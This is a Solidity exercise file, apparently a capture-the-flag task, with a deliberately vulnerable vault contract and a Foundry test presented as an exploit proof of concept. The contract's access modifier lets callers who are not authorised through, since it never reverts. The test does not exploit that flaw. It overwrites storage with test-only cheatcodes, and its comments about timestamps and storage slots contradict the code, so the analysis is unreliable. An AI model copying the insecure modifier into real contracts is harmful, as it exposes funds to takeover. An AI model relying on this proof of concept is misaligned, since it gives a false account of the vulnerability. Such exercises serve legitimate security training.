// SPDX-License-Identifier: MIT
// Find the vuln, write the exploit POC, and how to mitigate
pragma solidity ^0.8.18;
import "forge-std/Test.sol";

contract TreasureVault {
    uint256 public totalTreasure = 2500;
    address public currentExplorer;
    address public vaultKeeper = msg.sender;
    bool public isActive = true;
    uint256 private lastAccessTime;
    
    event ExplorerSelected(address indexed explorer, uint256 timestamp);
    
    modifier onlyDuringExpedition() {
        if (msg.sender == getVaultAccess()) {
            _;
        } else {
            checkCurrentExplorer();
        }
    }
    
    function getVaultAccess() internal view returns (address authorized) {
        assembly {
            authorized := sload(2)
        }
    }
    
    function initiateExpedition(
        address explorer, 
        uint256 timestamp
    ) public onlyDuringExpedition {
        require(isActive, "Expedition ended");
        lastAccessTime = timestamp;
        
        assembly {
            sstore(1, explorer)
        }
        
        emit ExplorerSelected(explorer, timestamp);
    }
    
    function checkCurrentExplorer() public view returns (address) {
        return currentExplorer;
    }
    
    function getLastAccessTime() public view returns (uint256) {
        return lastAccessTime;
    }
    
    function toggleExpeditionStatus() public {
        require(msg.sender == vaultKeeper, "Not authorized");
        isActive = !isActive;
    }
}

contract TreasureVaultTest is Test {
    TreasureVault vault;

    function setUp() public {
        vault = new TreasureVault();
    }

    function testFakeTimestamp() public {
        address attacker = address(this);

        // Step 1: Manipulate storage to set a past timestamp for `lastAccessTime`
        uint256 fakeTimestamp = 0; // Set a timestamp 10,000 seconds in the past
        uint256 lastAccessTimeSlot = 4; // Assuming `lastAccessTime` is at storage slot 4
        vm.store(address(vault), bytes32(lastAccessTimeSlot), bytes32(fakeTimestamp));

        // Verify that `lastAccessTime` is updated
        uint256 storedTimestamp = vault.getLastAccessTime();
        assertEq(storedTimestamp, fakeTimestamp, "Fake timestamp failed to update");

        // Step 2: Manipulate storage to grant attacker access to the vault
        vm.store(
            address(vault),
            bytes32(uint256(2)), // Storage slot 2 for current explorer
            bytes32(uint256(uint160(attacker))) // Attacker's address
        );

        vault.toggleExpeditionStatus(); // Start the expedition

        // Step 3: Attacker calls `initiateExpedition` with a fake timestamp
        uint256 attackerTimestamp = 0; // Fake timestamp for the expedition
        vault.initiateExpedition(attacker, attackerTimestamp);

        // Verify that the new `lastAccessTime` is updated to the attacker's fake timestamp
        uint256 newLastAccessTime = vault.getLastAccessTime();
        assertEq(newLastAccessTime, attackerTimestamp, "Exploit failed: lastAccessTime not updated correctly");
    }
}